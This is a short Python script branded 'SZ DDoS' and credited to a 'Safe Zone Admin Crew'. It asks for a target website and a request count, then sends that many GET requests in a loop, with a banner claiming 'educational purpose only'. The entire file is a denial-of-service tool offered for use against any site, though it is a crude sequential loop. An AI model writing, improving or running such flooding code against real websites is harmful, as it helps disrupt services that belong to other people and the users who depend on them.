import os
import requests as req

os.system("clear")
Red = '\033[1;31m'
Green = '\033[1;32m'
Yellow = '\033[1;33m'
Blue = '\033[1;34m'
Purple = '\033[1;35m'

os.system("figlet SZ DDoS | lolcat")
print()
print("\033[1;31m                           Tool Created By Safe Zone Admin Crew")
print("\033[1;31m                           Mr.Chamiya , Dark Hero , Noob Hacker")
print("\033[1;31m                           This Tool For Educational Purpose Only")
print()
y=int(input(" \033[1;32m Enter Request Value:-"))
print()
web=str(input(" \033[1;32m Enter Website:-"))
print()
ch=str(input("\033[1;32m Do You Want To See Request Text?(y/n)"))
print()
x = 1
while(x <= y):
    resp = req.get(web)
    if(ch=="y"):
       print("\033[1;33m",resp.text)
       x=x+1
    else:
       print("\033[1;34m",x," Request Sent")
       x=x+1
else:
        print("\033[1;34m Done")